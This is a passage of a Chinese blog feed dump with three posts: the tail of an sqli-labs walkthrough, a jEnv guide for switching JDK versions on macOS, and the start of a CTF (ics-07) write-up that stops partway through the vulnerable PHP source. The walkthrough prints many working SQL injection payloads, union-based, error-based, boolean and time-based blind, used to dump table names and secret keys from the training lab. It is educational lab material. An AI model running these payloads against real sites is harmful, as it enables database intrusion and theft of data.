class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(secret_XBJJ)+<span class="hljs-keyword">FROM</span>+HLBSTFO6HB)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>最后查到key值为：<code>kRTCQUzl170VXBxrCqlTWuyZ</code></p><hr><h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p>闭合方式：<code>id=($id)</code><br>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 验证</span><br>?id=1) <span class="hljs-comment">--+</span><br><br><span class="hljs-comment"># 查询表名</span><br>?id=-1) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><span class="hljs-comment"># P0ULLTHD09</span><br><br><span class="hljs-comment"># 查询字段名</span><br>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="hljs-keyword">WHERE</span>+TABLE_NAME=<span class="hljs-string">&#x27;P0ULLTHD09&#x27;</span>)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># id、sessid、secret_0SEC、tryy</span><br><br><span class="hljs-comment"># 查询key值</span><br>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(secret_0SEC)+<span class="hljs-keyword">FROM</span>+P0ULLTHD09)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># hSoUfCvuUNHhjG8CQInhuVv2</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>闭合方式不同。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 查询表名</span><br>?id=-1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>闭合方式不同。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 查询表名</span><br>?id=-1&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>uname 和 pass 都只输出数组中的结果，union 查询无法回显。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$unames=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Dumb&quot;</span>,<span class="hljs-string">&quot;Angelina&quot;</span>,<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;secure&quot;</span>,<span class="hljs-string">&quot;stupid&quot;</span>,<span class="hljs-string">&quot;superman&quot;</span>,<span class="hljs-string">&quot;batman&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin1&quot;</span>,<span class="hljs-string">&quot;admin2&quot;</span>,<span class="hljs-string">&quot;admin3&quot;</span>,<span class="hljs-string">&quot;dhakkan&quot;</span>,<span class="hljs-string">&quot;admin4&quot;</span>);<br>$pass = ($unames);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name : &#x27;</span>. $unames[$row[<span class="hljs-string">&#x27;id&#x27;</span>]];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password : &#x27;</span> .$pass[$row[<span class="hljs-string">&#x27;id&#x27;</span>]];<br><br></code></pre></td></tr></table></figure><p>但是可以输出报错信息，可以尝试进行报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27;+AND+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-number">1</span>+<span class="hljs-keyword">FROM</span>+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-keyword">CONCAT</span>((<span class="hljs-keyword">SELECT</span>(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">CAST</span>(<span class="hljs-keyword">CONCAT</span>(secret_OD68 )+<span class="hljs-keyword">AS</span>+<span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x7e</span>))+<span class="hljs-keyword">FROM</span>+WOO6ID239T+<span class="hljs-keyword">LIMIT</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">FLOOR</span>(<span class="hljs-keyword">RAND</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">GROUP</span>+<span class="hljs-keyword">BY</span>+x)a)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><h2 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h2><p>闭合方式：<code>id=$id</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 猜测闭合方式</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>        <span class="hljs-comment"># 正常显示</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+     # 正常显示</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;       <span class="hljs-comment"># 报错</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">--+    # 报错</span><br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">--+ # 有明显延时</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">--+ # 无延时</span><br><br><span class="hljs-comment"># 报错注入</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h2><p>闭合方式：<code>id=（&quot;$id&quot;）</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># 猜测闭合方式</span><br>?<span class="hljs-attribute">id</span>=1        # 正常显示（强制类型转化为1）<br>?<span class="hljs-attribute">id</span>=1--+     # 正常显示（强制类型转化为1）<br>?<span class="hljs-attribute">id</span>=1&#x27;       # 正常显示（强制类型转化为1）<br>?<span class="hljs-attribute">id</span>=1&#x27;--+    # 正常显示（强制类型转化为1）<br>?<span class="hljs-attribute">id</span>=1&quot;       # 报错,并能看到需要添加括号。<br>?<span class="hljs-attribute">id</span>=1&quot;) --+  # 正常显示<br><br><span class="hljs-comment"># 报错注入</span><br>?<span class="hljs-attribute">id</span>=0&quot;) <span class="hljs-keyword">or</span> updatexml(1, concat(0x7e, database(), 0x7e), 1)--+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h2><p>闭合方式：<code>id=((&#39;$id&#39;))</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 猜测闭合方式（自己手动多次后，可以考虑采用Burp Suite+字典进行测试）</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;         <span class="hljs-comment"># 报错，并且看到需要添加双层括号</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-comment">--+   # 正常显示</span><br><br><span class="hljs-comment"># 报错注入</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27;)) <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>不能报错注入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># 猜测闭合方式(在猜测时，最好列举一个比较全面的闭合方式来猜测)</span><br>?<span class="hljs-attribute">id</span>=1        # 正常显示<br>?<span class="hljs-attribute">id</span>=1&#x27;       # 报错（显示<br>?<span class="hljs-attribute">id</span>=1&#x27;)--+   # 正常显示<br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> sleep(3)--+<br><br><span class="hljs-comment"># 布尔注入</span><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;s&#x27;</span>, 1, 0)--+    # 不显示<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;c&#x27;</span>, 1, 0)--+    # 正常显示<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 2)=<span class="hljs-string">&#x27;ch&#x27;</span>, 1, 0)--+   # 正常显示<br><br><span class="hljs-comment"># 延时注入</span><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;s&#x27;</span>, sleep(3), 0)--+    # 不显示<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;c&#x27;</span>, sleep(3), 0)--+    # 明显延时<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 2)=<span class="hljs-string">&#x27;ch&#x27;</span>, sleep(3), 0)--+   # 明显延时<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>类似less-62</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># 猜测闭合方式</span><br>?<span class="hljs-attribute">id</span>=1        # 正常显示<br>?<span class="hljs-attribute">id</span>=1&#x27;       # 报错<br>?<span class="hljs-attribute">id</span>=1&#x27;--+    # 正常显示<br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> sleep(3)--+<br><br><span class="hljs-comment"># 布尔注入</span><br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;s&#x27;</span>, 1, 0)--+    # 不显示<br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;c&#x27;</span>, 1, 0)--+    # 正常显示<br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 2)=<span class="hljs-string">&#x27;ch&#x27;</span>, 1, 0)--+   # 正常显示<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h2><p>闭合方式：<code>id=(($id))</code></p><p>类似less-62</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>)) <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+    # 明显延时</span><br><br></code></pre></td></tr></table></figure><h2 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h2><p>闭合方式：<code>id=(&quot;$id&quot;)</code></p><p>类似less-62</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-attr">id=0&quot;)</span> <span class="hljs-literal">or</span> sleep(<span class="hljs-number">3</span>)--+    <span class="hljs-comment"># 明显延时</span><br><br></code></pre></td></tr></table></figure><h1 id="6-思维导图"><a href="#6-思维导图" class="headerlink" title="6 思维导图"></a>6 思维导图</h1><p>自己总结的思维导图。如果有更好的想法，欢迎和我交流<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210115123359.png"></p><p>幕布地址：<a href="https://share.mubu.com/doc/qV0gisrYy6">https://share.mubu.com/doc/qV0gisrYy6</a></p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考教程：</p><ol><li><a href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-lab教程——1-35通关Writeup-地址ch3nye.top</a></li><li><a href="https://www.sqlsec.com/2020/05/sqlilabs.html">SQLI labs 靶场精简学习记录-国光</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOS切换JDK版本的最佳姿势</title>
    <link href="/2021/01/04/2021%E5%B9%B41%E6%9C%884%E6%97%A5-MacOS%E5%88%87%E6%8D%A2JDK%E7%89%88%E6%9C%AC%E7%9A%84%E6%9C%80%E4%BD%B3%E5%A7%BF%E5%8A%BF/"/>
    <url>/2021/01/04/2021%E5%B9%B41%E6%9C%884%E6%97%A5-MacOS%E5%88%87%E6%8D%A2JDK%E7%89%88%E6%9C%AC%E7%9A%84%E6%9C%80%E4%BD%B3%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<p>jEnv 是 MacOS 一个管理 Java 版本的开源工具，这是它的<a href="https://www.jenv.be/">官方文档</a>，同时支持 Linux 和 MacOS。我最近在更新 Burp Suite 的时候用到了这个工具觉得挺不错的。</p><h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><p>Linux / OS X</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/jenv/jenv.git ~/.jenv<br></code></pre></td></tr></table></figure><p>Mac OS 使用 Homebrew 安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ brew install jenv<br></code></pre></td></tr></table></figure><h1 id="2-基本用法"><a href="#2-基本用法" class="headerlink" title="2 基本用法"></a>2 基本用法</h1><p>jEnv 并不具备安装 Java 版本和删除版本的功能，只是省去了像<a href="https://juejin.cn/post/6871959224314757134">这个教程</a>一样配置环境变量的麻烦，所以教程中依然使用 HomeBrew 安装 JDK。</p><h2 id="2-1-JDK安装"><a href="#2-1-JDK安装" class="headerlink" title="2.1 JDK安装"></a>2.1 JDK安装</h2><p>2019 年之后, Oracle 对 Java 的商业模式进行了一系列改革, 多种版本的 JDK 开始出现在开发者的视野中.</p><p>整体来看, 存在三个版本的 JDK, 分别是 <strong>Oracle JDK</strong>、<strong>Oracle 编译的 OpenJDK **和</strong>第三方厂商编译的 OpenJDK**. 其实三者在功能上并<strong>没有明显的差异</strong>。</p><p>其中 OpenJDK 提供的版本更为全面，AdoptOpenJDK 是完全免费的、无品牌的 OpenJDK 版本，基于 GPL 开源协议(+Classpath Extension), 以免费软件的形式提供社区版的 OpenJDK 二进制包, 公司也可安全且放心使用。</p><p>即使用下面的命令即可安装各种版本的 jdk。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 选择自己需要的版本</span><br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk8<br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk9<br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk10<br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk11<br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk12<br><br><span class="hljs-comment"># 安装最新版本 OpenJDK</span><br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk<br></code></pre></td></tr></table></figure><p>安装目录通常在<code>/Library/Java/JavaVirtualMachines</code>下，在配置 jEnv 的时候需要使用 JDK 的 HOME 目录。</p><h2 id="2-2-配置jEnv"><a href="#2-2-配置jEnv" class="headerlink" title="2.2 配置jEnv"></a>2.2 配置jEnv</h2><p>查看当前 jEnv 可管理的 Java 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ jenv versions<br>  system<br>  oracle64-1.6.0.39<br>* oracle64-1.7.0.11 (<span class="hljs-built_in">set</span> by /Users/hikage/.jenv/version)<br></code></pre></td></tr></table></figure><p>将 JDK 的 HOME 目录添加到 jEnv 中，只需要添加一次，以后就可以秒换 Java 环境。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-8.jdk/Contents/Home<br></code></pre></td></tr></table></figure><p>再次使用<code>jenv versions</code>后，就可以看到刚刚添加的 Java 的版本号。</p><h2 id="2-3-切换-Java-版本"><a href="#2-3-切换-Java-版本" class="headerlink" title="2.3 切换 Java 版本"></a>2.3 切换 Java 版本</h2><p>配置全局的 JDK 版本，把下面的<code>oracle64-1.6.0.39</code>替换成你的 jEnv 列出的 JDK 的版本信息。（如果不确定的话，可以到最下面看效果图）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ jenv global oracle64-1.6.0.39<br></code></pre></td></tr></table></figure><p>配置局部的 JDK 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ jenv <span class="hljs-built_in">local</span> oracle64-1.6.0.39<br></code></pre></td></tr></table></figure><h1 id="3-最后的效果"><a href="#3-最后的效果" class="headerlink" title="3 最后的效果"></a>3 最后的效果</h1><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210104200111.png"></p><p>参考博客：</p><ol><li><a href="https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html">https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html</a></li><li><a href="https://www.jianshu.com/p/1a147d5515f0">https://www.jianshu.com/p/1a147d5515f0</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-ics-07</title>
    <link href="/2020/12/29/2020%E5%B9%B412%E6%9C%8829%E6%97%A5-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-07/"/>
    <url>/2020/12/29/2020%E5%B9%B412%E6%9C%8829%E6%97%A5-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-07/</url>
    
    <content type="html"><![CDATA[<h1 id="1-源码审计"><a href="#1-源码审计" class="headerlink" title="1 源码审计"></a>1 源码审计</h1><p>打开网站进行体验过后，发现在「项目管理」位置可以点击，进入后可以查看该网页的源码。使用F12后并无其他异常情况。使用 dirsearch进行扫目录</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">[<span class="hljs-number">10</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">1</span>KB - /index.php  -&gt;  ?page=flag.php<br>[<span class="hljs-number">10</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">74</span>B  - /flag.php<br>[<span class="hljs-number">10</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /config.php<br>[<span class="hljs-number">10</span>:<span class="hljs-number">11</span>:<span class="hljs-number">59</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - /index.html<br></code></pre></td></tr></table></figure><p>对网站的源码进行大致的分析，并进行注释。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br><br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;title&gt;cetc7&lt;/title&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    session_start();<br><br>    <span class="hljs-comment">// 设置未page参数</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[page])) &#123;<br>        show_source(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-comment">// 设置page参数，并且page不等于index.php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[page]) &amp;&amp; $_GET[page] != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        header(<span class="hljs-string">&#x27;Location: ?page=flag.php&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">?&gt;</span><br>    &lt;!-- page和id的表单 --&gt;<br>    &lt;form action=<span class="hljs-string">&quot;#&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>        page : &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;page&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;<br>        id : &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;id&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>    &lt;/form&gt;<br>    &lt;br /&gt;<br>    &lt;a href=<span class="hljs-string">&quot;index.phps&quot;</span>&gt;view-source&lt;/a&gt;<br><br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> ($_SESSION[<span 